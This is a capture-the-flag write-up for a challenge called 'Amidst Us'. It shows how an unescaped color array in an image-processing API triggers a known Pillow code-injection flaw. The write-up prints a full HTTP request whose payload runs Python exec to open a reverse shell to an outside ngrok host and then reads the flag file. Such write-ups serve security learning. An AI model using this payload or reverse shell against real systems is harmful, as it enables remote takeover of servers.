# Amidst Us
The application allows us to upload an imagefile and to pick an alpha color. All this data is being sent to a backend API at `/api/alphafy`, which then executes some dynamically parametrized imagemagick functions to build an alpha-channelled image.

## Exploit
Because the array `color` is being used without escaping it in `utils.py#21-24`, we first check for existing vulnerabilities with the imageprocessing library `PIL`. And lo and behold, there is a command injection vulnerability: https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-2331901.

Exploiting this allowed usage of `exec()`, we can execute arbitrary python code, meaning we can also spawn a [reverse shell using python](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux#python).

Payload:
```
POST /api/alphafy HTTP/1.1
Content-Type: application/json

{
    "background":[
        "exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"2.tcp.eu.ngrok.io\",18065));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);')",
        0,
        0
    ]
    "image":"/9j/4AAQSkZJRg..."
}
```

After landing the reverse shell, we can grab the flag using `cat /flag.txt`.